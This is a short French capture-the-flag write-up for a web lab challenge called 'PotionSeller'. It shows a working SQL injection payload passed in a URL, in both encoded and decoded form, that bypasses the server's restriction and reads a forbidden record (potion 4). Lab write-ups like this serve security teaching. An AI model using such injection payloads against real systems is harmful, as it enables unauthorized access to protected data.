## PotionSeller

Ce challenge consiste à accéder à la potion 4 car tout le monde veut connaître ses secrets !

Malheureusement le marchand de potion nous l'interdit :(. Heureusement qu'il existe les injections sql pour palier le problème !


Pour ce faire nous allons passer par l'url afin de questionner le serveur.
 ```URL
 https://potionseller.secu-web.blackfoot.dev/potions/1%20OR%20id%20%3E%203%20AND%20id%20%3C%205%20order%20by%20id%20desc
 ```
 after url decode
 
 ```URL
 https://potionseller.secu-web.blackfoot.dev/potions/1 OR id > 3 AND id < 5 order by id desc
 ```
